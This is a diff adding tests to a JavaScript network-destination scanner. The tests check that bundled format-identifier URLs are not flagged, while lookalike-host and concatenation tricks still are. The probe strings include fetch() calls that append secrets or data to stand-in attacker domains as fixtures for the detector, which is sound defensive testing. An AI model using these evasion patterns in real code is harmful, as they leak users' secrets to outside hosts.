@@ -342,6 +342,34 @@ describe('scanShape', () => {
     expect(shapeRedLines(['network'], destinations)).toEqual([])
   })
 
+  it('does not read bundled format identifiers as plaintext requests', () => {
+    const { destinations } = scanShape(input({
+      'a.js': [
+        'const doctype = \'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\'',
+        'if (frame.owner_identifier === "http://musicbrainz.org") id = frame.identifier',
+      ].join('\n'),
+    }))
+    expect(destinations).toEqual([])
+    expect(shapeRedLines(['network'], destinations)).toEqual([])
+  })
+
+  it('still flags the identifier hosts on any other path, subdomain, or concatenation', () => {
+    const probes = [
+      'fetch("http://musicbrainz.org/ws/2/recording?query=" + q)',
+      'fetch("http://www.apple.com/")',
+      'fetch("http://www.apple.com/DTDs/PropertyList-1.0.dtd?leak=" + data)',
+      'fetch("http://musicbrainz.org.attacker.test2/x")',
+      'fetch("http://musicbrainz.org" + ".attacker.net/" + secret)',
+      'fetch("http://musicbrainz.org".concat(".attacker.net"))',
+      'fetch("http://www.apple.com/DTDs/PropertyList-1.0.dtd" + "/../../exfil")',
+    ]
+    for (const probe of probes) {
+      const { destinations } = scanShape(input({ 'a.js': probe }))
+      expect(destinations.some(d => d.kind === 'http-host'), probe).toBe(true)
+      expect(shapeRedLines(['network'], destinations), probe).not.toEqual([])
+    }
+  })
+
   it('drops doc-block example URLs, which bundlers keep in shipped output', () => {
     const { destinations } = scanShape(input({
       'a.js': [
